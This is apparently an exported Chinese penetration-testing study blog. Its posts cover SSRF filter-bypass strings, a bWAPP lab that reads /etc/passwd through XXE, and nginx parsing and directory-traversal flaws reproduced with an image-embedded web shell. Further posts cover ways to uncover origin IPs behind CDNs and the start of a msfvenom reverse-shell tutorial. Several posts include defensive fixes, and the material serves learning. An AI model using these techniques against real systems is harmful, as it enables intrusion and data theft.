<h5 id="常见的绕过方法"><a href="#常见的绕过方法" class="headerlink" title="常见的绕过方法"></a>常见的绕过方法</h5><ul>
<li><p>@绕过：<code>http://xxx.com@10.10.10.10=10.10.10.10</code></p>
</li>
<li><p>利用特殊的域名</p>
</li>
<li><p>利用句号</p>
<p>127。0。0。1=&gt;127.0.0.1</p>
</li>
<li><p>利用协议</p>
</li>
<li><p>利用Enclosed </p>
</li>
<li><p>IP使用其他进制：127.0.0.1=2130706433</p>
</li>
<li><p>使用短地址：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> ==<a href="https://dwz.lc/2fGYWaE" target="_blank" rel="noopener">https://dwz.lc/2fGYWaE</a></p>
</li>
</ul>
<h5 id=""><a href="#" class="headerlink" title=""></a><img src="QQ%E6%88%AA%E5%9B%BE20200212110340.png" alt=""></h5><h4 id="bWAPP靶场实战（SSRF"><a href="#bWAPP靶场实战（SSRF" class="headerlink" title="bWAPP靶场实战（SSRF)"></a>bWAPP靶场实战（SSRF)</h4><h5 id="一、使用（RFI）远程文件包含进行端口扫描（内网探测）"><a href="#一、使用（RFI）远程文件包含进行端口扫描（内网探测）" class="headerlink" title="一、使用（RFI）远程文件包含进行端口扫描（内网探测）"></a>一、使用（RFI）远程文件包含进行端口扫描（内网探测）</h5><p>我们进入bWAPP  SSRF部分。</p>
<img src="QQ截图20200128162933.png" style="zoom:50%;" />



<p>我们点击黑体字Port scan得到了端口扫描的攻击脚本</p>
<img src="QQ截图20200128163234.png" style="zoom:50%;" />



<p>我们退出SSRF模块 进入（RFI/LFI)模块，发现?language=lang_en.php此处可能存在文件包含漏洞。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128163521.png" alt=""></p>
<p>我们在VM中开启了虚拟机，得知IP为192.168.153.131</p>
<img src="QQ截图20200128164256.png" style="zoom:50%;" />



<h5 id="二、使用XXE获取敏感文件中的内容"><a href="#二、使用XXE获取敏感文件中的内容" class="headerlink" title="二、使用XXE获取敏感文件中的内容"></a>二、使用XXE获取敏感文件中的内容</h5><p>我们先点击黑体字获取XXE攻击脚本。</p>
<img src="QQ截图20200128170206.png" style="zoom:67%;" />

<p><img src="QQ%E6%88%AA%E5%9B%BE20200128170255.png" alt=""></p>
<p> 然后使用Burp抓包后发送到Repeater模块，</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128171953.png" alt=""></p>
<p> 第一次我们使用http协议读取robots.txt文件内容</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128175808.png" alt=""></p>
<p>第二次我们使用php协议读取 xml页面中的内容</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128175940.png" alt=""></p>
<p>第三次我们使用file协议读取本机的/etc/passwd的内容</p>
<img src="QQ截图20200128180043.png" style="zoom:67%;" />



<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://xz.aliyun.com/t/7333" target="_blank" rel="noopener">https://xz.aliyun.com/t/7333</a></p>
<p><a href="https://damit5.com/2018/05/26/SSRF-漏洞学习" target="_blank" rel="noopener">https://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0</a></p>
<p><a href="https://www.cnblogs.com/zhaijiahui/p/7828585.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/7828585.html</a></p>
]]></content>
      <categories>
        <category>web漏洞学习</category>
      </categories>
      <tags>
        <tag>SSRF漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx中间件漏洞</title>
    <url>/2020/04/03/nginx-zhong-jian-jian-lou-dong/</url>
    <content><![CDATA[<h2 id="Nginx-系列漏洞复现"><a href="#Nginx-系列漏洞复现" class="headerlink" title="Nginx -系列漏洞复现"></a><strong>Nginx -系列漏洞复现</strong></h2><p>IIS是微软开发的web服务器，需要收费，主要用来跑asp.net asp php，只能在windows下运行。</p>
<p>Apache是Apache基金会的web服务器，免费，只支持静态界面，是html容器，应用范围广泛。</p>
<p>Tomcat是Apache基金会的java服务器，主要用来跑jsp php python等</p>
<p>Ngnix是反向代理服务器，它是代理，本身并不执行，是个传话筒，把用户提交的请求转发给web服务器，再把web服务器的结果转发给用户。为了提高性能，启用反向代理，实际的web服务器可以有很多台，而Ngnix放在前面，可以把这些web服务器整合成一个虚拟的更强大的服务</p>
<h4 id="Nginx-文件解析漏洞"><a href="#Nginx-文件解析漏洞" class="headerlink" title="Nginx-文件解析漏洞"></a>Nginx-文件解析漏洞</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​          nginx是一款高性能的web服务器，使用非常广泛，其不仅经常被用作反向代理，也可以非常好的支持PHP的运行。80sec发现其中存在一个较为严重的安全问题，默认情况下可能导致服务器错误的将任何类型的文件以PHP的方式进行解析，这将导致严重的安全问题，使得恶意的攻击者可能攻陷支持php的nginx服务器。<br>​          漏洞格式：test.jpg/a.php</p>
<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们首先打开phpstudy切换版本为nginx-5.2.17</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200131115008.png" alt=""></p>
<p>我们可以从phpstudy下的nginx的index.html复制到网站根目录下</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200131115049.png" alt=""></p>
<p>我们从本地打开网站的该页面即可看到nginx的欢迎页面</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200131115112.png" alt=""></p>
<p>我们在C盘根目录下新建shell.php写入如下代码。然后任意选择一张图片。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200131115532.png" alt=""></p>
<p>我们在命令行下选择使用管理员打开命令行，然后使用copy命令制作图片马。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200131120017.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200131120033.png" alt=""></p>
<p>然后我们在本地网站根目录下创建文件上传页面。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200131121704.png" alt=""></p>
<img src="QQ截图20200131121729.png" style="zoom:50%;" />

<img src="QQ截图20200131121803.png" style="zoom:50%;" />







<p>我们将我们刚刚制作好的图片马进行上传，发现提示上传成功。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200131122629.png" alt=""></p>
<p>我们在本地网站根目录下进行查看</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200131122944.png" alt=""></p>
<img src="QQ截图20200131123013.png" style="zoom:67%;" />



<p>我们在shell.jpg后添加/a.php或/b.php后发现可以成功解析。</p>
<img src="QQ截图20200131123036.png" style="zoom:67%;" />

<h5 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h5><p> 将php.ini文件中的cgi.fix_pathinfo的值设为0，这样php在解析1.php/1.jpg这样的目录时，只要1.jpg不存在就会显示404.</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200131123518.png" alt=""></p>
<h4 id="nginx-目录遍历漏洞"><a href="#nginx-目录遍历漏洞" class="headerlink" title="nginx-目录遍历漏洞"></a>nginx-目录遍历漏洞</h4><h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​       目录遍历（路径遍历）是由于web服务器或者web应用程序对用户输入的文件名称的安全性验证不足而导致的一种安全漏洞。使得攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件（可以是web根目录以外的文件），甚至执行系统命令。</p>
<p>​      程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。</p>
<h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们首先需要将nginx的配置文件nginx.conf中autoindex off；改为on;</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200131182922.png" alt=""></p>
<p>我们任意访问网站根目录下的某一文件夹，即可看到该目录下的所有文件，出现目录遍历漏洞。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200131183226.png" alt=""></p>
<h5 id="漏洞防御-1"><a href="#漏洞防御-1" class="headerlink" title="漏洞防御"></a>漏洞防御</h5><p>将nginx的配置文件nginx.conf下改为autoindex   off即可；</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200131182922.png" alt=""></p>
]]></content>
      <categories>
        <category>中间件漏洞</category>
      </categories>
      <tags>
        <tag>nginx学习</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过CDN查找ip方法总结</title>
    <url>/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/</url>
    <content><![CDATA[<h2 id="绕过CDN查找真实IP方法总结"><a href="#绕过CDN查找真实IP方法总结" class="headerlink" title="绕过CDN查找真实IP方法总结"></a>绕过CDN查找真实IP方法总结</h2><h4 id="什么是CDN以及CDN加速？"><a href="#什么是CDN以及CDN加速？" class="headerlink" title="什么是CDN以及CDN加速？"></a>什么是CDN以及CDN加速？</h4><p><strong>(摘自百度百科）</strong></p>
<p>​        CDN的全称是Content Delivery Network，即<a href="https://baike.baidu.com/item/内容分发网络/4034265" target="_blank" rel="noopener">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p>
<p><img src="4610b912c8fcc3ce005c05d19c45d688d53f20b0%5B1%5D.png" alt=""></p>
<p>比较常见的基于公有云的高可用架构，即：</p>
<pre><code>域名--&gt;CDN，CDN--&gt;WAF，WAF--&gt;SLB，SLB--&gt;ECS</code></pre><p><strong>CDN对网站有什么好处?</strong></p>
<p>​    首先，开启CDN后的网站，会根据用户所在地的不同访问CDN的节点服务器，并不直接访问源服务器，这样可以减少网站服务器宽带资源,降低服务器压力。这也就是大家都在ping百度,但是不同地区得到的反馈ip不一样的原因。</p>
<p>​    其次，由于CDN节点的阻挡防护，可以更好的保护员服务器的安全。具体来说，CDN其实是充当了一个替身的角色，无论服务器是渗透还是DD0S攻击，攻击的目标都将是CDN节点，这样一来便间接的保护了网站本身。</p>
<p><strong>为什么我们需要绕过CDN？</strong></p>
<pre><code>   对于我们渗透测试者来说，我们在信息收集中重要的一步就是要得到目标服务器主机的**真实IP地址**，但如果目标服务器部署了CDN服务，那么往往我们直接访问得到的IP只是CDN节点服务器的IP，而不是真实的源服务器的IP地址，这是就需要我们想办法绕过CDN获取源服务器IP。</code></pre><p>下面我收集了一些常见的绕过CDN的方法，留作记录:</p>
<h4 id="验证是否存在CDN"><a href="#验证是否存在CDN" class="headerlink" title="验证是否存在CDN"></a>验证是否存在CDN</h4><h5 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h5><p>很简单，使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：<br> <a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a><br> <a href="http://ping.aizhan.com/" target="_blank" rel="noopener">http://ping.aizhan.com/</a><br> <a href="http://ce.cloud.360.cn/" target="_blank" rel="noopener">http://ce.cloud.360.cn/</a></p>
<p>我们这里打开第一个网站：ping一下<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200427093341.png" alt=""></p>
<p>这里可以看出百度的独立IP有17个，且各个节点的返回速度存在不同的延迟。说明百度采用了CDN服务，但是ping没有办法确认真实IP。</p>
<h5 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h5><p>使用 nslookup 进行检测，原理同上，如果返回域名解析对应多个 IP 地址多半是使用了 CDN。有 CDN 的示例：</p>
<blockquote>
<p> <a href="http://www.163.com/" target="_blank" rel="noopener">www.163.com</a><br> 服务器:  public1.114dns.com<br> Address:  114.114.114.114</p>
<p> 非权威应答:<br> 名称:    163.xdwscache.ourglb0.com<br> Addresses:  58.223.164.86</p>
<p> ​          125.75.32.252<br> Aliases:  <a href="http://www.163.com/" target="_blank" rel="noopener">www.163.com</a></p>
<p> ​          <a href="http://www.163.com.lxdns.com/" target="_blank" rel="noopener">www.163.com.lxdns.com</a></p>
</blockquote>
<p>无 CDN 的示例：</p>
<blockquote>
<p> xiaix.me<br> 服务器:  public1.114dns.com<br> Address:  114.114.114.114</p>
<p> 非权威应答:<br> 名称:    xiaix.me<br> Address:  192.3.168.172  </p>
</blockquote>
<p>下面我收集了一些常见的绕过CDN查找真实IP的方法，留作记录:</p>
<h4 id="绕过-CDN-查找网站真实-IP"><a href="#绕过-CDN-查找网站真实-IP" class="headerlink" title="绕过 CDN 查找网站真实 IP"></a>绕过 CDN 查找网站真实 IP</h4><h5 id="1-查询历史DNS记录"><a href="#1-查询历史DNS记录" class="headerlink" title="1:查询历史DNS记录"></a>1:查询历史DNS记录</h5><p>1）查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br> <a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>     ###DNS查询<br> <a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>    ###微步在线<br> <a href="http://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=</a>    ###在线域名信息查询<br> <a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a>        ###DNS、IP等查询<br> <a href="https://tools.ipip.net/cdn.php" target="_blank" rel="noopener">https://tools.ipip.net/cdn.php</a>  ###CDN查询IP</p>
<p>2）利用<a href="https://securitytrails.com/" target="_blank" rel="noopener">SecurityTrails</a>平台，攻击者就可以精准的找到真实原始IP。他们只需在搜索字段中输入网站域名，然后按Enter键即可，这时“历史数据”就可以在左侧的菜单中找到。</p>
<p>如何寻找隐藏在CloudFlare或TOR背后的真实原始IP</p>
<p><img src="1058583-20181009230838766-860479177%5B1%5D.png" alt=""></p>
<p>除了过去的DNS记录，即使是当前的记录也可能泄漏原始服务器IP。例如，MX记录是一种常见的查找IP的方式。如果网站在与web相同的服务器和IP上托管自己的邮件服务器，那么原始服务器IP将在MX记录中。</p>
<p><strong>MX记录</strong></p>
<p>邮件交换记录 (<strong>MX record</strong>)是域名系统（DNS）中的一种资源记录类型，用于指定负责处理发往收件人域名的邮件服务器</p>
<h5 id="2-查询子域名寻找真实IP"><a href="#2-查询子域名寻找真实IP" class="headerlink" title="2.查询子域名寻找真实IP"></a>2.查询子域名寻找真实IP</h5><p>毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。</p>
<p>下面介绍些常用的子域名查找的方法和工具：</p>
<p>1）微步在线(<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>)</p>
<p>上文提到的微步在线功能强大，黑客只需输入要查找的域名(如baidu.com)，点击子域名选项就可以查找它的子域名了，但是免费用户每月只有5次免费查询机会。如图：</p>
<p><img src="1058583-20181009230922994-1826758810%5B1%5D.png" alt=""></p>
<p>2）Dnsdb查询法。(<a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>)</p>
<p>黑客只需输入baidu.com type:A就能收集百度的子域名和ip了。如图：<br> <img src="QQ%E6%88%AA%E5%9B%BE20200427094630.png" alt=""></p>
<p>3）Google 搜索</p>
<p>Google site:baidu.com -www就能查看除www外的子域名，如图：</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200427095533.png" alt=""></p>
<p>4）各种子域名扫描器</p>
<p>这里，主要为大家推荐子域名挖掘机和lijiejie的subdomainbrute(<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a>)</p>
<p>子域名挖掘机仅需输入域名即可基于字典挖掘它的子域名，如图：</p>
<p><img src="1058583-20181009231018377-2070670991%5B1%5D.png" alt=""></p>
<p>Subdomainbrute以windows为例，黑客仅需打开cmd进入它所在的目录输入</p>
<p><code>Python subdomainbrute.py baidu.com --full</code></p>
<p>即可收集百度的子域名，如图：</p>
<p><img src="1058583-20181009231030794-1664451845%5B1%5D.png" alt=""></p>
<p>注：收集子域名后尝试以解析ip不在cdn上的ip解析主站，真实ip成功被获取到。</p>
<h5 id="3：网络空间引擎搜索法"><a href="#3：网络空间引擎搜索法" class="headerlink" title="3：网络空间引擎搜索法"></a>3：网络空间引擎搜索法</h5><p>常见的有以前的钟馗之眼，<a href="https://www.shodan.io/" target="_blank" rel="noopener">shodan</a>，<a href="https://fofa.so/" target="_blank" rel="noopener">fofa搜索</a>。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip，如图：</p>
<p> <img src="1058583-20181009231044976-1731199101%5B1%5D.png" alt=""></p>
<h5 id="4-利用SSL证书寻找真实原始IP"><a href="#4-利用SSL证书寻找真实原始IP" class="headerlink" title="4:利用SSL证书寻找真实原始IP"></a>4:利用SSL证书寻找真实原始IP</h5><p><strong>SSL证书</strong></p>
<p>​        SSL证书是<a href="https://baike.baidu.com/item/数字证书/326874" target="_blank" rel="noopener">数字证书</a>的一种，类似于驾驶证、护照和营业执照的电子副本。因为配置在服务器上，也称为SSL服务器证书。SSL 证书就是遵守 SSL协议，由受信任的数字证书颁发机构CA，在验证服务器身份后颁发，具有服务器身份验证和数据传输加密功能。</p>
<p>​        以CloudFlare这款CDN加速器举例：假如你在 abc.com 上托管了一个服务，原始服务器IP是136.23.63.44。 而CloudFlare则会为你提供DDoS保护，Web应用程序防火墙和其他一些安全服务，以保护你的服务免受攻击。</p>
<p>​        为此，你的Web服务器就必须支持SSL并具有证书，此时CloudFlare与你的服务器之间的通信，就像你和CloudFlare之间的通信一样，会被加密（即没有灵活的SSL存在）。这看起来很安全，但问题是，当你在端口443<code>https://136.23.63.44:443</code>上直接连接到IP时，SSL证书就会被暴露。</p>
<p>​        此时，如果攻击者扫描0.0.0.0/0，即整个互联网，他们就可以在端口443上获取在 aaa.com上的有效证书，进而获取提供给你的Web服务器IP。</p>
<p><a href="https://link.zhihu.com/?target=https%3A//censys.io/certificates/">https://censys.io/certificates/</a> 通过SSL证书查询真实IP（推荐）</p>
<p><strong>Censys证书查询搜索步骤如下：</strong></p>
<p>1、aaa.com 证书的搜索查询参数为：<code>parsed.names：aaa.com</code></p>
<p>只显示有效证书的查询参数为：<code>tags.raw：trusted</code></p>
<p>攻击者可以在Censys上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成。</p>
<p>2、组合后的搜索参数为：<code>parsed.names: aaa.com and tags.raw: trusted</code></p>
<p>3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的“<strong>Explore</strong>”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; <strong>IPv4 Hosts</strong>；</p>
<p>隐藏服务具有SSL证书，要查找它使用的IPv4，只需将”SHA1 fingerprint”（签名证书的sha1值，也就是SHA1指纹）粘贴到Censys平台IPv4主机搜索中，即可找到证书，使用此方法可以轻松找到配置错误的Web服务器真实IP。</p>
<h5 id="方法5-利用HTTP标头寻找真实原始IP"><a href="#方法5-利用HTTP标头寻找真实原始IP" class="headerlink" title="方法5:利用HTTP标头寻找真实原始IP"></a>方法5:利用HTTP标头寻找真实原始IP</h5><p>借助SecurityTrails这样的平台，任何人都可以在茫茫的大数据搜索到自己的目标，甚至可以通过比较HTTP标头来查找到原始服务器。</p>
<p>特别是当用户拥有一个非常特别的服务器名称与软件名称时，攻击者找到你就变得更容易。</p>
<p>如果要搜索的数据相当多，如上所述，攻击者可以在Censys上组合搜索参数。假设你正在与1500个Web服务器共享你的服务器HTTP标头，这些服务器都发送的是相同的标头参数和值的组合。而且你还使用新的PHP框架发送唯一的HTTP标头（例如：X-Generated-Via：XYZ框架），目前约有400名网站管理员使用了该框架。而最终由三个服务器组成的交集，只需手动操作就可以找到了IP，整个过程只需要几秒钟。</p>
<p>例如，Censys上用于匹配服务器标头的搜索参数是80.http.get.headers.server :，查找由CloudFlare提供服务的网站的参数如下</p>
<p>80.http.get.headers.server:cloudflare</p>
<p><img src="1058583-20181009231212219-1764707602%5B1%5D.png" alt=""></p>
<h5 id="方法6-利用网站返回的内容寻找真实原始IP"><a href="#方法6-利用网站返回的内容寻找真实原始IP" class="headerlink" title="方法6:利用网站返回的内容寻找真实原始IP"></a>方法6:利用网站返回的内容寻找真实原始IP</h5><p>如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。</p>
<p>浏览网站源代码，寻找独特的代码片段。在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics，reCAPTCHA）是攻击者经常使用的方法。</p>
<p>以下是从HackTheBox网站获取的Google Analytics跟踪代码示例：</p>
<pre><code>ga（&#39;create&#39;，&#39;UA-93577176-1&#39;，&#39;auto&#39;）;</code></pre><p>​        可以使用80.http.get.body：参数通过body/source过滤Censys数据，不幸的是，正常的搜索字段有局限性，但你可以在Censys请求研究访问权限，该权限允许你通过Google BigQuery进行更强大的查询。</p>
<p><strong>Shodan</strong></p>
<p>Shodan是一种类似于Censys的服务，也提供了http.html搜索参数。</p>
<h5 id="7-使用国外主机解析域名"><a href="#7-使用国外主机解析域名" class="headerlink" title="7:使用国外主机解析域名"></a>7:使用国外主机解析域名</h5><p>​        国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。</p>
<p>​       我这里通过国外主机nslookup查询国内163.com对应IP。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200427095107.png" alt=""></p>
<p>我们可以看到只返回了一条对应IP，猜测应该是真实IP。</p>
<p>这里推荐一个国外的多节点ping工具。</p>
<p>域名：<a href="http://www.just-ping.com/" target="_blank" rel="noopener">http://www.just-ping.com/</a></p>
<h5 id="8-网站漏洞查找"><a href="#8-网站漏洞查找" class="headerlink" title="8:网站漏洞查找"></a>8:网站漏洞查找</h5><p>1.目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。</p>
<p> 2.XSS盲打，命令执行反弹shell，SSRF等。可以让服务器主动访问我们预设的web服务器，那么就能在日志里面看见目标网站服务器的真实IP。</p>
<p> 3.无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。</p>
<h5 id="9-网站邮件订阅查找"><a href="#9-网站邮件订阅查找" class="headerlink" title="9:网站邮件订阅查找"></a>9:网站邮件订阅查找</h5><p>RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。</p>
<h4 id="如何防止CDN被绕过？"><a href="#如何防止CDN被绕过？" class="headerlink" title="如何防止CDN被绕过？"></a>如何防止CDN被绕过？</h4><p>通过中间件配置只允许域名访问，禁止ip访问。</p>
<p>这样处理的话，所有直接访问站点真实IP的请求将会被拒绝，任何用户只能通过域名访问站点，通过预先设定的网络链路，从DNS→CDN→waf防护→源站，所有的域名访问请求都必须经过WAF检测。</p>
<h5 id="Nginx参考配置："><a href="#Nginx参考配置：" class="headerlink" title="Nginx参考配置："></a>Nginx参考配置：</h5><pre><code>#添加一个server,在原server里绑定域名
server  {
        listen 80 default;
        server_name _;
        return 403;
    }
server {
        listen       80;
        server_name  www.demo.com;
        .........</code></pre><h5 id="Apache参考配置"><a href="#Apache参考配置" class="headerlink" title="Apache参考配置:"></a>Apache参考配置:</h5><pre><code>#在httpd.conf最后面加上

&lt;VirtualHost 此处填写IP&gt;
        ServerName 此处填写IP
        &lt;Location /&gt;
            Order Allow,Deny
            Deny from all
        &lt;/Location&gt;
&lt;/VirtualHost&gt;

&lt;VirtualHost 此处填写IP&gt;
        DocumentRoot /var/www/html
        ServerName   此处填写域名
&lt;/VirtualHost&gt;</code></pre><h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://zhuanlan.zhihu.com/p/116026247" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/116026247</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/107294740" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/107294740</a></p>
<p><a href="https://www.fujieace.com/penetration-test/cdn-find-ip.html" target="_blank" rel="noopener">https://www.fujieace.com/penetration-test/cdn-find-ip.html</a></p>
<p><a href="https://forum.90sec.com/t/topic/524" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/524</a></p>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>绕过CDN</tag>
      </tags>
  </entry>
  <entry>
    <title>msf反弹payload学习</title>
    <url>/2020/04/27/msf-fan-dan-payload-xue-xi/</url>
    <content><![CDATA[<h2 id="学习msfvenom生成反弹payload总结"><a href="#学习msfvenom生成反弹payload总结" class="headerlink" title="学习msfvenom生成反弹payload总结"></a>学习msfvenom生成反弹payload总结</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><pre><code>   我们知道目前来说流行的shell主要有两种，一种是**正向shell(bind_shell)**一种是**反向shell(reverse_shell)**</code></pre><p><strong>正向shell</strong>:攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。(攻击者-&gt;被攻击者)</p>
<p><strong>反向shell:</strong>被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。(攻击者&lt;-被攻击者)</p>
<p><strong>nc</strong>可以实现一个很简单的正向与反向shell连接的示例：</p>
<p>正向</p>
<p><img src="1208761-20190108155228561-656308830.png" alt=""></p>
<p>反向</p>
<p><img src="1208761-20190108140558839-392665606.png" alt=""></p>
<p>对于实际的渗透测试过程来说，我们常常使用的往往是反弹shell的方式来突破边界防火墙的限制。</p>
<p><strong>下面列举了一些使用反向shell的情况：</strong></p>
<ul>
<li>目标机器在一个不同（相对攻击者而言）的私有网络</li>
<li>目标机器的防火墙阻挡了所有入口连接（这种情况正向 Shell 是会被防火墙阻挡的）.</li>
<li>由于一些原因，你的 Payload 不能绑定在应该绑定的端口的时候</li>
<li>你还不能确定应该选择反向 Shell 还是正向 Shell 的时候</li>
</ul>
<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>​        msfvenom是msfpayload,msfencode的结合体，可利用msfvenom生成木马程序,并在目标机上执行,在本地监听上线。Msfvenom 在 2015 年 6 月 8 日已经替代了 msfpayload 与 msfenocde 命令，它是这两个命令的结合体。为了开始使用 msfvenom，可以首先浏览一下它所支持的命令参数：</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200427142626.png" alt=""></p>
<pre><code>Options:
    -p, --payload       &lt;payload&gt;    Payload to use. Specify a &#39;-&#39; or stdin to use custom payloads # 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取
        --payload-options            List the payload&#39;s standard options # 列出指定 Payload 的标准可选配置项
    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, all
    -n, --nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload # 指定 nop 在 payload 中的数量（译者注：类似堆喷射中通过 nop 滑动到 payload）
    -f, --format        &lt;format&gt;     Output format (use --help-formats for a list) # 指定 Payload 的输出格式
        --help-formats               List available formats # 列出所有可用的输出格式
    -e, --encoder       &lt;encoder&gt;    The encoder to use # 指定使用的 Encoder
    -a, --arch          &lt;arch&gt;       The architecture to use # 指定目标系统架构
        --platform      &lt;platform&gt;   The platform of the payload # 指定目标系统平台
        --help-platforms             List available platforms # 列出可用的平台
    -s, --space         &lt;length&gt;     The maximum size of the resulting payload # 设置未经编码的 Payload 的最大长度
        --encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value) # 编码后的 Payload 的最大长度
    -b, --bad-chars     &lt;list&gt;       The list of characters to avoid example: &#39;\x00\xff&#39; # 设置需要在 Payload 中避免出现的字符
    -i, --iterations    &lt;count&gt;      The number of times to encode the payload # 设置 Payload 的编码次数
    -c, --add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include # 指定包含一个额外的win32 shellcode文件
    -x, --template      &lt;path&gt;       Specify a custom executable file to use as a template # 指定一个特定的可执行文件作为模板
    -k, --keep                       Preserve the template behavior and inject the payload as a new thread # 保护模板程序的功能，注入的payload作为一个新的进程运行
    -o, --out           &lt;path&gt;       Save the payload # 保存 Payload 到文件
    -v, --var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats # 指定一个变量名
（译者注：当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）
        --smallest                   Generate the smallest possible payload # 尽可能生成最短的 Payload
    -h, --help                       Show this message # 帮助</code></pre><p>我们可以通过命令列出可用的payloads、encoders、nops。</p>
<pre><code>msfvenom --list payloads
msfvenom --list encoders
msfvenom --list nops</code></pre><p>下面我们使用msf生成一些可用的反弹shell的paylaod。</p>
<h4 id="生成二进制文件"><a href="#生成二进制文件" class="headerlink" title="生成二进制文件"></a>生成二进制文件</h4><p>关于二进制文件，主要介绍适用于Windows、linux、mac操作系统的payload生成与利用。</p>
